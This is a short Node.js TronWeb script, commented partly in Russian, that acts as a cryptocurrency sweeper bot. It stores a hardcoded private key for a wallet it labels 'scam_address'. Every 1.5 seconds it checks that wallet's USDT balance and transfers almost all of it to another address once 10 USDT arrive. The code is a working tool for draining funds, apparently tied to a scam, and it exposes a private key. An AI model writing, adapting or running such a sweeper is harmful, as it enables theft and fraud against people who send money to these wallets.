const { TronWeb } = require('tronweb');

const scam_address = 'TS64QAQEL5GfbB61C86ZSJjfkVi6kPFmEA';
const real_private_key = '061390b49c9ac51ecfe8a00e3d66632f602d2e9e8a239facbea87fc59df80c2e';
const send_to = 'TBuNQWiSEYMQYbzZZFF9boLnYrrxNLAVAt';
const usdt_contract_address = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT TRC20 contract address

async function main() {
    try {
        const tronWeb = new TronWeb({
            fullHost: 'https://api.trongrid.io',
        });

        let check_it = setInterval(async function () {
            try {
                const contract = await tronWeb.contract().at(usdt_contract_address);
                let balance = await contract.methods.balanceOf(scam_address).call();
                console.log(`Current USDT balance: ${balance / 1e6} USDT`); // делим на 1e6 для корректного отображения

                if (balance / 1e6 >= 10) { // Проверяем, достаточно ли USDT для вывода
                    const withdraw_amount = balance - 2000000; // Учитываем лимит
                    console.log(`Withdrawing ${withdraw_amount / 1e6} USDT`);

                    const first_tx = await contract.methods.transfer(send_to, withdraw_amount).send({
                        from: scam_address,
                        privateKey: real_private_key,
                    });

                    console.log(`Transaction successful: ${first_tx}`);
                }
            } catch (err) {
                console.log(err.message);
            }
        }, 1500);
    } catch (err) {
        console.log(err);
    }
}

main();
